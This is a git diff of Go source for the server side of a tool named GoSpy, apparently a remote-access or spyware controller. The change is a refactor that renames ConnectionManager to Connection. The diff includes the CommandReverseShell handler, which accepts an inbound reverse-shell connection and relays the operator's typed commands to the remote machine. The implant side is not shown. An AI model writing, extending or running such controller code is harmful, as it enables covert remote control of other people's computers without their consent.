@@ -11,9 +11,9 @@ import (
 
 // GoSpyClient represents a GoSpy client that is connected to this server.
 type GoSpyClient struct {
-	listener    net.Listener            // The server for listening to for connections from the client.
-	cm          comms.ConnectionManager // The ConnectionManager for the main connection to the client.
-	passwordStr string                  // The password for a secure connection.
+	listener    net.Listener     // The server for listening to for connections from the client.
+	connection  comms.Connection // The main connection to the client.
+	passwordStr string           // The password for encrypting data over the connection.
 }
 
 // NewGoSpyClient creates instantiates a GoSpyClient.
@@ -30,25 +30,25 @@ func NewGoSpyClient(bindAddress, password string) (client GoSpyClient, err error
 
 // sendString sends a string to the client.
 func (c GoSpyClient) sendString(message string) (err error) {
-	return c.cm.SendBytes([]byte(message))
+	return c.connection.SendBytes([]byte(message))
 }
 
 // recvString receives a string from the client.
 func (c GoSpyClient) recvString() (message string, err error) {
-	data, err := c.cm.RecvBytes()
+	data, err := c.connection.RecvBytes()
 	if err != nil {
 		return "", err
 	}
 	return string(data), nil
 }
 
-// WaitForClient calls WaitForConnection and then sets the returned ConnectionManager to the GoSpyClient's cm field.
+// WaitForClient calls WaitForConnection and then sets the returned Connection to the GoSpyClient's connection field.
 func (c *GoSpyClient) WaitForClient() {
-	c.cm = c.WaitForConnection()
+	c.connection = c.WaitForConnection()
 }
 
-// WaitForConnection waits for a successful connection to the listener and then sets up and returns a ConnectionManager.
-func (c GoSpyClient) WaitForConnection() comms.ConnectionManager {
+// WaitForConnection waits for a successful connection to the listener and then sets up and returns a Connection.
+func (c GoSpyClient) WaitForConnection() comms.Connection {
 	for {
 		conn, err := c.listener.Accept()
 		if err != nil {
@@ -61,9 +61,9 @@ func (c GoSpyClient) WaitForConnection() comms.ConnectionManager {
 	}
 }
 
-// Close closes the current connection manager.
+// Close closes the current connection.
 func (c GoSpyClient) Close() (err error) {
-	return c.cm.Close()
+	return c.connection.Close()
 }
 
 // CommandExit sends a message to the client for it to stop.
@@ -87,19 +87,19 @@ func (c GoSpyClient) CommandReverseShell() (err error) {
 		return err
 	}
 
-	cm := c.WaitForConnection()
+	reverseShellConnection := c.WaitForConnection()
 
 	fmt.Println("Type `exit` to leave the shell at any time")
-	_ = comms.BridgeConnectionManagerToWriter(cm, os.Stdout)
+	_ = comms.BridgeConnectionToWriter(reverseShellConnection, os.Stdout)
 
 	for {
 		reader := bufio.NewReader(os.Stdin)
 		text, _ := reader.ReadString('\n')
 
 		textBytes := []byte(text)
-		err = cm.SendBytes(textBytes)
+		err = reverseShellConnection.SendBytes(textBytes)
 		if err != nil {
-			// Don't return the error because this is with the reverse shell connection, not with the original cm conn.
+			// Don't return the error because this is with the reverse shell connection, not with the original connection conn.
 			fmt.Printf("Reverse shell connection error: %s\n", err.Error())
 			break
 		}
@@ -109,6 +109,6 @@ func (c GoSpyClient) CommandReverseShell() (err error) {
 		}
 	}
 
-	_ = cm.Close()
+	_ = reverseShellConnection.Close()
 	return nil
 }
